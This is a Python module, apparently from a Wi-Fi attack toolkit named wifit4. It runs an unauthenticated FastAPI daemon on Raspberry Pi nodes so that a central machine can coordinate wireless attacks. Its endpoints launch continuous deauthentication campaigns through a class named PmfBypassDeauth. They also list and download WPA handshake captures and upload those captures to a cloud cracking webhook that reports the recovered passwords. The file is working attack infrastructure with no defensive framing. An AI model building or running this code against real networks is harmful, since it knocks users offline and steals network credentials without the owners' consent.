"""
Phase 6 - Headless mesh daemon (FastAPI REST).

Exposes a REST API that lets a central laptop control one or more wifit4
nodes running on Raspberry Pi Zero 2 W / mini-boards without a screen.

Endpoints:
  GET  /status           → node health, active interface, current channel
  GET  /scan             → current AP table as JSON
  POST /scan/start       → begin channel-hopping scan
  POST /scan/stop        → stop scan
  POST /attack/deauth    → start deauth campaign {bssid, client, strategy}
  POST /attack/stop      → stop all attacks
  GET  /captures         → list .hc22000 / .pcap captures
  GET  /captures/{name}  → download a capture file
  POST /crack/submit     → submit capture to cloud webhook
  WebSocket /events      → SSE-style stream of capture events

Run a node::

    python -m wifit4.mesh.daemon --host 0.0.0.0 --port 8765

Then from the central machine::

    curl http://pi-node-1.local:8765/status
"""
from __future__ import annotations

import asyncio
import json
import logging
from pathlib import Path
from typing import Any

log = logging.getLogger("wifit4.mesh.daemon")

try:
    from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect
    from fastapi.responses import FileResponse
    import uvicorn as _uvicorn  # noqa: F401 - used in serve()
    _FASTAPI_AVAILABLE = True
except ImportError:
    _FASTAPI_AVAILABLE = False
    FastAPI = None  # type: ignore[misc,assignment]


def build_app(node: "MeshDaemon") -> Any:
    if not _FASTAPI_AVAILABLE:
        raise RuntimeError("fastapi and uvicorn are required: pip install fastapi uvicorn")

    app = FastAPI(title="wifit4 Mesh Node", version="4.0.0")

    @app.get("/status")
    async def status() -> dict:
        return node.status()

    @app.get("/scan")
    async def scan_results() -> dict:
        return {"aps": node.ap_table()}

    @app.post("/scan/start")
    async def scan_start() -> dict:
        await node.start_scan()
        return {"ok": True}

    @app.post("/scan/stop")
    async def scan_stop() -> dict:
        node.stop_scan()
        return {"ok": True}

    @app.post("/attack/deauth")
    async def deauth(body: dict) -> dict:
        bssid    = body.get("bssid", "")
        client   = body.get("client")
        strategy = body.get("strategy", "ADAPTIVE")
        if not bssid:
            raise HTTPException(400, "bssid required")
        await node.start_deauth(bssid, client, strategy)
        return {"ok": True, "bssid": bssid}

    @app.post("/attack/stop")
    async def attack_stop() -> dict:
        node.stop_attacks()
        return {"ok": True}

    @app.get("/captures")
    async def captures() -> dict:
        return {"files": node.list_captures()}

    @app.get("/captures/{name}")
    async def download_capture(name: str) -> FileResponse:
        path = node.capture_path(name)
        if not path or not path.exists():
            raise HTTPException(404, "capture not found")
        return FileResponse(str(path))

    @app.post("/crack/submit")
    async def crack_submit(body: dict) -> dict:
        name = body.get("file")
        if not name:
            raise HTTPException(400, "file required")
        job_id = await node.submit_crack(name, body.get("webhook_url", ""))
        return {"ok": True, "job_id": job_id}

    @app.websocket("/events")
    async def events(ws: WebSocket) -> None:
        await ws.accept()
        queue = node.subscribe_events()
        try:
            while True:
                event = await asyncio.wait_for(queue.get(), timeout=30)
                await ws.send_text(json.dumps(event))
        except (WebSocketDisconnect, asyncio.TimeoutError):
            node.unsubscribe_events(queue)

    return app


class MeshDaemon:
    """
    Lightweight node controller.  Owns the WlanInterface, captures dir,
    and routes REST calls to the appropriate wifit4 subsystems.

    In a full integration WlanInterface / chip driver is injected via
    set_interface().  For headless Raspberry Pi deployment, the daemon
    is started from __main__ which handles driver bring-up first.
    """

    def __init__(self, capture_dir: Path | None = None) -> None:
        self._interface     = None  # WlanInterface injected later
        self._capture_dir   = capture_dir or Path.home() / ".wifit4" / "captures"
        self._capture_dir.mkdir(parents=True, exist_ok=True)
        self._event_queues: list[asyncio.Queue] = []
        self._active_attacks: list[Any] = []
        self._scanning = False

    def set_interface(self, interface: Any) -> None:
        self._interface = interface

    # -- REST handlers -------------------------------------------------------

    def status(self) -> dict:
        iface = self._interface
        return {
            "scanning":  self._scanning,
            "interface": str(iface) if iface else None,
            "channel":   getattr(iface, "current_channel", None),
            "version":   "4.0.0",
        }

    def ap_table(self) -> list[dict]:
        if not self._interface:
            return []
        try:
            aps = self._interface.access_points  # wifit4.wlan.WlanInterface attr
            return [
                {
                    "bssid":      ap.bssid,
                    "ssid":       ap.ssid,
                    "channel":    ap.channel,
                    "rssi":       ap.signal,
                    "encryption": str(ap.encryption),
                }
                for ap in aps.values()
            ]
        except Exception:
            return []

    async def start_scan(self) -> None:
        if self._interface:
            await self._interface.start_hopping()
        self._scanning = True
        self._emit_event({"type": "scan_started"})

    def stop_scan(self) -> None:
        if self._interface:
            try:
                self._interface.stop_hopping()
            except Exception:
                pass
        self._scanning = False

    async def start_deauth(self, bssid: str, client: str | None, strategy: str) -> None:
        from wifit4.attacks.deauth import PmfBypassDeauth, DeauthStrategy
        if not self._interface:
            return
        strat = DeauthStrategy[strategy] if strategy in DeauthStrategy.__members__ else DeauthStrategy.ADAPTIVE
        deauth = PmfBypassDeauth(
            ap_bssid=bssid,
            ap_channel=getattr(self._interface, "current_channel", 6),
            inject_fn=self._interface.inject_frame,
            strategy=strat,
            on_client_evicted=lambda mac: self._emit_event({"type": "client_evicted", "mac": mac}),
        )
        if client:
            deauth.add_client(client)
        self._active_attacks.append(deauth)
        asyncio.create_task(deauth.run_continuous(client))

    def stop_attacks(self) -> None:
        for attack in self._active_attacks:
            try:
                attack.stop()
            except Exception:
                pass
        self._active_attacks.clear()

    def list_captures(self) -> list[str]:
        return [f.name for f in self._capture_dir.glob("*") if f.is_file()]

    def capture_path(self, name: str) -> Path | None:
        p = self._capture_dir / name
        return p if p.exists() and p.parent == self._capture_dir else None

    async def submit_crack(self, filename: str, webhook_url: str) -> str:
        from wifit4.crack.cloud_crack import CloudCrackUploader, CrackJob
        path = self.capture_path(filename)
        if not path:
            return "not_found"
        job = CrackJob(ssid="unknown", bssid="unknown", hc22000_path=path)
        uploader = CloudCrackUploader(
            webhook_url=webhook_url,
            on_result=lambda r: self._emit_event({"type": "crack_result", "psk": r.psk}),
        )
        asyncio.create_task(uploader.submit(job))
        return str(path.stem)

    # -- event bus -----------------------------------------------------------

    def subscribe_events(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue(maxsize=128)
        self._event_queues.append(q)
        return q

    def unsubscribe_events(self, q: asyncio.Queue) -> None:
        try:
            self._event_queues.remove(q)
        except ValueError:
            pass

    def _emit_event(self, event: dict) -> None:
        for q in self._event_queues:
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                pass

    # -- server start --------------------------------------------------------

    def serve(self, host: str = "0.0.0.0", port: int = 8765) -> None:
        if not _FASTAPI_AVAILABLE:
            raise RuntimeError("pip install fastapi uvicorn")
        app = build_app(self)
        import uvicorn
        uvicorn.run(app, host=host, port=port, log_level="info")
